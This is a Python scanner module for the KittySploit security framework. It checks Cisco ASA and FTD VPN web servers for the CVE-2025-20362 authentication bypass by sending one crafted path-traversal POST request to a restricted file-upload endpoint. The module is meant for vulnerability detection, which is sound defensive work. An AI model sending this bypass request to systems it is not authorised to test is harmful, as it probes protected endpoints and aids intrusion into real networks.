#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in the VPN web server of Cisco Secure Firewall Adaptive Security Appliance (ASA) Software and ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco Secure Firewall ASA & FTD - Authentication Bypass Detection',
        'description': 'A vulnerability in the VPN web server of Cisco Secure Firewall Adaptive Security Appliance (ASA) Software and Cisco Secure Firewall Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to access restricted URL endpoints that are related to remote access VPN that should otherwise be inaccessible without authentication. This vulnerability is due to improper validation of user-supplied input in HTTP(S) requests.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'cisco', 'asa', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://attackerkb.com/topics/Szq5u0xgUX/cve-2025-20362/rapid7-analysis',
            'https://nvd.nist.gov/vuln/detail/cve-2025-20362',
        ],
        'cve': 'CVE-2025-20362',
    }

    def run(self):
        path = '/+CSCOU+//../+CSCOE+/files/file_action.html?mode=upload&path=foo&server=srv&sourceurl=qaz'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded;boundary=ee'}, data='aabbccdd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ("<script>alert('CSRF token mismatch')", 'Failed to upload file',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Cisco Secure Firewall ASA & FTD - Authentication Bypass detected', path=path)
            return True
        return False

